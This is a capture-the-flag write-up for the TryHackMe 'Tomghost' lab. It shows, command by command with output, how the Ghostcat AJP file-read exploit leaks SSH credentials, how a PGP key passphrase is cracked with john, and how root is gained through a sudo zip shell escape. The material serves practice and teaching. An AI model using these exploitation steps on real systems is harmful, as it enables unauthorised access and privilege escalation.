# Tomghost

I'd consider [this room](https://tryhackme.com/room/tomghost) in one of the most easiest rooms on TryHackMe. Though, there is one confusing point but if you know the proper way to get around solving this room and getting both the flags won't be difficult. This room is based on one of the broadly known vulnerabilities in Tomcat which is Ghostcat, using which we can get access to the machine. Also this room need basic knowledge of PGP encryption (even if you don't have, you'll learn). So, let's begin!



### Initial Foothold

The first thing that we can do is check out if there is some webpage hosted on the machine's URL, which in this case is of no use. This suggests that port 80 must not be open on the machine. So, to check the ports we can run an nmap scan on the machine:

```
┌─[tester@parrot-virtual]─[~/Downloads/tomghost]
└──╼ $nmap -A 10.10.0.168
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 19:02 IST
Nmap scan report for 10.10.0.168
Host is up (0.16s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.81 seconds
```

From the nmap scan we can see that on port 8080, Apache Tomcat is running. We can browse to that using the address `<machine_ip>:8080`:

![default_tomcat](./.images/default_tomcat.png)

Here, we can see the default page for Apache Tomcat and also the version that it is running which is 9.0.30. So,now we have a point for which we can look for exploits. After some googling, we can find [this article](https://www.tenable.com/blog/cve-2020-1938-ghostcat-apache-tomcat-ajp-file-readinclusion-vulnerability-cnvd-2020-10487) which discusses about the Ghostcat vulnerability in Apache Tomcat. Now, all we need to look for an exploit related to this vulnerability. While looking for an exploit, I found [this article](https://www.chaitin.cn/en/ghostcat) from Chaitin Tech, the organization that discovered this flaw in Tomcat. In the article, they've mentioned:

> Ghostcat is a serious vulnerability in Tomcat discovered by security researcher of Chaitin Tech. Due to a flaw in the Tomcat AJP protocol, an attacker can read or include any files in the webapp directories of Tomcat. For example, An attacker can read the webapp configuration files or source code. In addition, if the target web application has a file upload function, the attacker may execute malicious code on the target host by exploiting file inclusion through Ghostcat vulnerability.

So, with the help of this vulnerability, we can directly read the configuration files of Apache and look for some useful information over there.

After visiting a few more websites, we can find [this exploit on github](https://github.com/00theway/Ghostcat-CNVD-2020-10487) which provides the exploit script along with a few screenshot to guide us how to use the exploit. We can clone the repository and run the script as explained:

```
┌─[tester@parrot-virtual]─[~/Downloads/tomghost/Ghostcat-CNVD-2020-10487]
└──╼ $python3 ajpShooter.py http://10.10.0.168 8009 /WEB-INF/web.xml read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902632000"
[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:***********************
  </description>

</web-app>
```

So, we have got login credentials for a user named `skyfuck` on the machine. We can use these credentials and try to access the machine via SSH:

```
┌─[tester@parrot-virtual]─[~/Downloads/tomghost]
└──╼ $ssh skyfuck@10.10.0.168
The authenticity of host '10.10.0.168 (10.10.0.168)' can't be established.
ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.168' (ECDSA) to the list of known hosts.
skyfuck@10.10.0.168's password: 

skyfuck@ubuntu:~$ ls -la
total 40
drwxr-xr-x 3 skyfuck skyfuck 4096 Sep 26 07:05 .
drwxr-xr-x 4 root    root    4096 Mar 10  2020 ..
-rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrc
drwx------ 2 skyfuck skyfuck 4096 Sep 26 07:05 .cache
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
```

But we don't see the `user.txt` file here. So, we can find it as:

```
skyfuck@ubuntu:~$ find / -name user.txt 2> /dev/null 
/home/merlin/user.txt
```

So, it appears that there is another user as well on the machine named as `merlin`. But even then we can try to access the flag file.

```
skyfuck@ubuntu:~$ cat /home/merlin/user.txt 
**************************
```

And we do get the user flag!

### Privilege Escalation

Now that we have the user flag, we need to escalate our privileges to obtain the root file. So, we can check commands can the user `skyfuck` perform as `sudo`:

```
skyfuck@ubuntu:~$ sudo -l
[sudo] password for skyfuck: 
Sorry, user skyfuck may not run sudo on ubuntu.
```

From the above response, it is clear that we first need to escalate our privileges to user `merlin` and from there we can try to become `root`. 

While looking around at the files in `skyfuck`'s directory, we can see two files `credentials.pgp` which is not in readable format and the other `tryhackme.asc` which contains a PGP private key.

It took me a while to understand how these two files are related with each other until I found [this article](https://superuser.com/questions/46461/decrypt-pgp-file-using-asc-key). So, we can try to do the same by first importing the ASC key and then decrypting the PGP file.

```
skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
gpg: directory `/home/skyfuck/.gnupg' created
gpg: new configuration file `/home/skyfuck/.gnupg/gpg.conf' created
gpg: WARNING: options in `/home/skyfuck/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/home/skyfuck/.gnupg/secring.gpg' created
gpg: keyring `/home/skyfuck/.gnupg/pubring.gpg' created
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

So, here we have imported the `tryhakme.asc` key and next thing we need to do is decrypt the `credential.pgp` file:

```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
Enter passphrase: 
```

But here it asks for a passphrase that we don't know. So, we need to find a file to extract the passphrase from either of the two `ASC` or `PGP` files.

After some googling, I came around [this article](https://www.ubuntuvibes.com/2012/10/recover-your-gpg-passphrase-using-john.html) where it has explained how we can extract the passphrase from an `ASC` key by first converting it to a hash understandable by `john` and then extracting the passphrase from that hash using `john`. If the `gpg2john` is not present in your system it can found in [this repository](https://github.com/openwall/john). 

The next thing that we need to do is to obtain the `tryhackme.asc` file the target machine on our local machine. This can be done by starting a `python http server` on the target machine and using `wget` on our local machine to retrieve the file:

On the target machine:

```
skyfuck@ubuntu:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
```

On our local machine:

```
┌─[tester@parrot-virtual]─[~/Downloads/tomghost/Ghostcat-CNVD-2020-10487/john]
└──╼ $wget http://10.10.0.168:8000/tryhackme.asc
--2020-09-26 20:02:24--  http://10.10.0.168:8000/tryhackme.asc
Connecting to 10.10.0.168:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5144 (5.0K) [text/plain]
Saving to: ‘tryhackme.asc’

tryhackme.asc               100%[===========================================>]   5.02K  2.27KB/s    in 2.2s    

2020-09-26 20:02:27 (2.27 KB/s) - ‘tryhackme.asc’ saved [5144/5144]
```

Now, we can run `gpg2john` on the ASC file and convert it to a hash understandable by `john`. 

```
┌─[tester@parrot-virtual]─[~/Downloads/tomghost/Ghostcat-CNVD-2020-10487/john]
└──╼ $gpg2john tryhackme.asc > hash_for_john
```

The next thing that we need to do is run `john` on the newly created file named `hash_for_john`. 

```
┌─[tester@parrot-virtual]─[~/Downloads/tomghost/Ghostcat-CNVD-2020-10487/john]
└──╼ $john hash_for_john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********        (tryhackme)
1g 0:00:00:00 DONE (2020-09-26 20:07) 9.090g/s 9745p/s 9745c/s 9745C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

So, `john` has provided us the passphrase using which we can decrypt the `credential.pgp` file. Now, we can head back to the target machine and decrypt the PGP file:

```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:************************************************************
```

Now we can switch user to `merlin` using the obtained password and check the command that can be performed with `sudo` privilege:

```
skyfuck@ubuntu:~$ su merlin 
Password: 
merlin@ubuntu:/home/skyfuck$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Here, we can we see that we can run the zip command as `root`. So, we can look for an exploit for `zip` on [GTFOBins](https://gtfobins.github.io/) and try to perform the steps as mentioned over there and replacing `zip` with `/usr/bin/zip`.

```
merlin@ubuntu:/home/skyfuck$ TF=$(mktemp -u)
merlin@ubuntu:/home/skyfuck$ sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# sudo rm $TF
rm: missing operand
Try 'rm --help' for more information.
# whoami
root
# cat /root/root.txt
```

With this, we escalated our privileges to root level and obtained the root flag!

## Some Key Points to Take Away

1. Always check Apache Tomcat for Ghostcat vulnerability.
2. Whenever you find a PGP and ASC file, try to decrypt the data using `gpg --import` and `gpg --decrypt`.
3. To crack ASC file passphrase use `gpg2john` and `john`.

### Links Referred

1. TryHackMe Tomghost: https://tryhackme.com/room/tomghost
2. Tenable Blog on Ghostcat Vulnerability: https://www.tenable.com/blog/cve-2020-1938-ghostcat-apache-tomcat-ajp-file-readinclusion-vulnerability-cnvd-2020-10487
3. Chaitin Tech Article and Gostcat Vulnerability Detection Tool: https://www.chaitin.cn/en/ghostcat
4. Ghostcat Exploit by 00theway on GitHub: https://github.com/00theway/Ghostcat-CNVD-2020-10487 
5. Decrypt PGP Using ASC Key: https://superuser.com/questions/46461/decrypt-pgp-file-using-asc-key
6. Recover Your GPG Passphrase Using JTR: https://www.ubuntuvibes.com/2012/10/recover-your-gpg-passphrase-using-john.html
7. John Repository on GitHub: https://github.com/openwall/john 
8. GTFOBins: https://gtfobins.github.io/